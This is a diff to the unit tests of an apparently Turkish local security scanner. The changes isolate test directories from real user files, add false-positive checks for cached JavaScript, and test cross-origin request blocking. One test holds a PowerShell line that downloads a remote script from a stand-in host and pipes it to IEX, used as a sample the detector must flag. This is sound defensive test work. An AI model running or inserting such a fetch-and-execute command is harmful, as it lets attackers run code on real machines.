@@ -5,8 +5,27 @@ import tempfile
 import unittest
 import zipfile
 
-os.environ["KALKAN_DATA_DIR"] = tempfile.mkdtemp(prefix="kalkan-test-")
+# Testler kullanıcının gerçek dosyalarına ASLA dokunmamalı. Dosya taşıyan/silen her modülün klasörü
+# geçici bir köke yönlendirilir. (Önceki bir sürümde dış site koruması testi gerçek ~/.kalkan/karantina
+# klasörüne "boşalt" isteği gönderip kullanıcının karantinadaki dosyalarını silmişti.)
+TEST_KOK = tempfile.mkdtemp(prefix="kalkan-test-")
+for _ad, _alt in {
+    "KALKAN_DATA_DIR": "data", "KALKAN_KARANTINA_DIR": "karantina", "KALKAN_INDIRME_DIZINI": "Downloads",
+    "KALKAN_UYGULAMA_DIZINLERI": "Applications", "KALKAN_KULLANICI_LIBRARY": "Library",
+}.items():
+    os.environ[_ad] = os.path.join(TEST_KOK, _alt)
+os.environ["KALKAN_OTOMATIK_TARAMA_SAAT"] = "0"
+os.environ["KALKAN_WATCH_DIR"] = ""
+os.environ["KALKAN_IMAP_HOST"] = ""
 os.environ["KALKAN_LLM"] = "0"  # testler dış API çağırmaz (.env'deki ayarı ezer)
+
+from kalkan import config as _config  # noqa: E402
+
+# Yönlendirme tutmadıysa (ör. .env ya da kabuk değişkeni öncelik aldıysa) hiçbir test çalışmasın
+for _yol in (_config.DATA_DIR, _config.KARANTINA_DIR, _config.INDIRME_DIZINI, _config.KULLANICI_LIBRARY,
+             *_config.UYGULAMA_DIZINLERI):
+    if not os.path.realpath(str(_yol)).startswith(os.path.realpath(TEST_KOK)):
+        raise SystemExit(f"GÜVENLİK: test ayarı gerçek bir klasörü gösteriyor: {_yol}")
 
 from kalkan.detectors.file import EICAR, dosya_analiz  # noqa: E402
 from kalkan.detectors.text import metin_analiz  # noqa: E402
@@ -309,6 +328,24 @@ class SistemTaramaTest(unittest.TestCase):
         self.assertIsNone(baslangic_ogesi_analiz(iyi))
         self.assertNotEqual(baslangic_ogesi_analiz(gizli).seviye, "guvenli")
 
+    def test_uygulama_onbellegindeki_js_alarm_vermez(self):
+        # Gerçek bir Mac'te TikTok LIVE Studio önbelleğindeki 133 .js dosyası "downloadFile" adı yüzünden
+        # şüpheli bulunmuş ve karantinaya alınmıştı
+        js = b"export async function downloadFile(url){ const r = await fetch(url); return r.blob(); }"
+        self.assertEqual(dosya_analiz(js, "template.js", baglam="sistem").seviye, "guvenli")
+        tampon = io.BytesIO()
+        with zipfile.ZipFile(tampon, "w") as z:
+            z.writestr("plugin/index.js", js)
+        self.assertEqual(dosya_analiz(tampon.getvalue(), "res.zip", baglam="sistem").seviye, "guvenli")
+        # Uygulama veri klasöründeki betikler sistem taramasında derin incelenmez
+        from pathlib import Path
+        from kalkan import sistem_tarama
+        self.assertFalse(sistem_tarama._derin_mi(Path.home() / "Library" / "Application Support" / "X" / "a.js"))
+        self.assertFalse(sistem_tarama._derin_mi(Path.home() / ".vscode" / "extensions" / "y" / "b.js"))
+        # Gerçek PowerShell indirme komutu hâlâ yakalanır
+        ps = b"(New-Object Net.WebClient).DownloadString('http://x.top/a.ps1') | IEX"
+        self.assertIn("supheli_kod", [b.kod for b in dosya_analiz(ps, "kur.ps1").bulgular])
+
     def test_pdf_icindeki_rastgele_iex_alarm_vermez(self):
         # Gerçek PDF'lerde sıkıştırılmış veride rastgele "IeX" yanlış alarm üretiyordu
         s = dosya_analiz(b"%PDF-1.7\nstream\x89IeX\x02\x91endstream", "belge.pdf", baglam="sistem")
@@ -413,14 +450,16 @@ class BaskaSiteKorumaTest(unittest.TestCase):
     def test_dis_siteden_gelen_degisiklik_istegi_reddedilir(self):
         from fastapi.testclient import TestClient
         from kalkan.main import app
+        # Koruma tüm değişiklik isteklerine aynı ara katmanda uygulanır; bu yüzden zararsız bir uç noktayla
+        # sınanır. Dosya silen uç noktalar (karantinayı boşalt vb.) testte asla çağrılmaz.
+        govde = {"url": "https://a.com"}
         with TestClient(app) as c:
-            govde = {"onay": True}
-            r = c.post("/api/karantina/bosalt", json=govde, headers={"Origin": "https://kotu-site.example"})
+            r = c.post("/api/tara/url", json=govde, headers={"Origin": "https://kotu-site.example"})
             self.assertEqual(r.status_code, 403)
-            r = c.post("/api/karantina/bosalt", json=govde, headers={"Origin": "null"})
+            r = c.post("/api/tara/url", json=govde, headers={"Origin": "null"})
             self.assertEqual(r.status_code, 403)
             # Panelin kendisi, Chrome eklentisi ve Origin göndermeyen yerel araçlar (curl) kabul edilir
-            self.assertEqual(c.post("/api/karantina/bosalt", json=govde, headers={"Origin": "http://testserver"}).status_code, 200)
+            self.assertEqual(c.post("/api/tara/url", json=govde, headers={"Origin": "http://testserver"}).status_code, 200)
             self.assertEqual(c.post("/api/tara/url", json={"url": "https://a.com"},
                                     headers={"Origin": "chrome-extension://abcdef"}).status_code, 200)
             self.assertEqual(c.post("/api/tara/url", json={"url": "https://a.com"}).status_code, 200)
